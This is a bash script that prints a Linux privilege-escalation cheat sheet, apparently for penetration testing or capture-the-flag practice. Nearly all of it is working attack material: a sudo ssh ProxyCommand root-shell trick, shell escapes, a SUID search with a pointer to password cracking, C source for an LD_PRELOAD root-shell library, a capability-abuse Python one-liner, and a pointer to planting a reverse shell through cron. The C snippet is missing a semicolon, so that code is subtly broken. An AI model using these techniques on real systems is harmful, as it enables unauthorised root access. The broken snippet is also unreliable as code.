#!/bin/bash

echo "Here are some tricks and tools you can use for privilege escalation"
echo ""
echo "	(0) Tools you can look into"
echo "		LinEnum: https://github.com/rebootuser/LinEnum"
echo "		LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester"
echo "		Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration"
echo "		Linux Priv Checker: https://github.com/linted/linuxprivchecker"
echo ""
echo "	(00) Websites you can use"
echo "		GTFObins: https://gtfobins.github.io/"
echo "		Linux Kernel CVEs: https://www.linuxkernelcves.com/cves"
echo ""
echo "	(1) Use linpeass.sh. A general privilege escalation scan"
echo "		linpeass.sh"
echo ""
echo "	(2) Root ssh shell. If you have root ssh privileges, the following command will yield a root shell"
echo "		sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
echo ""
echo "	(3) Use more. If you can sudo use more to read a file, you can run this command (while in more) to get root shell:"
echo "		!sh"
echo ""
echo "	(4) See if you can use any tools that have SUID bit with the command:"
echo "		find / -type f -perm -04000 -ls 2>/dev/null"
echo "	      Can be used in conjunction with unshadow to crack passwords."
echo "	      See also: https://gtfobins.github.io/"
echo ""
echo "	(5) C code root shell with LD_PRELOAD"
echo "		5.1) Do sudo -l and check for the following line. If doesn't exist, this won't work."
echo "			env_keep+=LD_PRELOAD"
echo "		5.2) Create the following C file and compile as share object (.so) file."
echo "			This script will spawn a root shell."
echo ""
echo "			#include <stdio.h>"
echo "			#include <sys/types.h>"
echo "			#include <stdlib.h>"
echo "			void _init() {"
echo "			unsetenv(\"LD_PRELOAD\")"
echo "			setgid(0);"
echo "			setuid(0);"
echo "			system(\"/bin/bash\");"
echo "			}"
echo "		5.3) Compile with the following command"
echo "			gcc -fPIC -shared -o <filename>.so <filename>.c -nostartfiles"
echo "		5.4) Run the binary with any program that our user can run with sudo."
echo "			This should start a root shell."
echo ""
echo "			sudo LD_PRELOAD=/home/user/ldpreload/<filename>.so <program-command>"
echo "			Example, find: sudo LD_PRELOAD=/home/user/ldpreload/sell.so find"
echo ""
echo "	(6) Python one-liner launch root shell"
echo "		6.1) See which capabilities you have, see if you have any editor/viewer such as vim"
echo "			getcap -r / 2>/dev/null"
echo "		6.2) Run one-liner on command line using the tool from step 6.1 above"
echo "			./<vim or whatever> -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
echo ""
echo "	(7) Cronjobs"
echo "		7.1) View the crontab to see if there are any cronjobs that can be changed"
echo "			cat /etc/crontab"
echo "		7.2) If you can change any scripts running, add a reverse shell to attacker machine"
echo "			See -g revshell and look at entry (1)"

















